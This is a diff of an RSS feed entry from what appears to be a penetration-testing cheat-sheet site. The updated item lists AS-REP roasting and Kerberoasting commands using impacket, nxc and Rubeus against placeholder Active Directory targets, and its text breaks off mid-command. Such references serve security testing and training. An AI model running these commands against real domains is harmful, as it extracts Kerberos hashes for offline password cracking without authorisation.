@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/roasting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/roasting/</guid>
-      <description> AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting (From Linux) faketime -f +8h impacket-GetNPUsers -request &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt Note: Times skew have to be within 5 minutes in kerberos&#xA;Kerberoasting (From Windows) .\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password </description>
+      <description>AS_REP Roasting # Multiple valid usernames impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 example.com/user Kerberoasting From Linux # Fix time skew sudo ntpdate -s 10.10.11.10 &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;example.com/username:password&amp;#39; -dc-ip 10.10.11.10 Note: Times skew have to be within 5 minutes in kerberos&#xA;# Kerberoasting without cred sudo ntpdate -s 10.</description>
     </item>
   </channel>
 </rss>
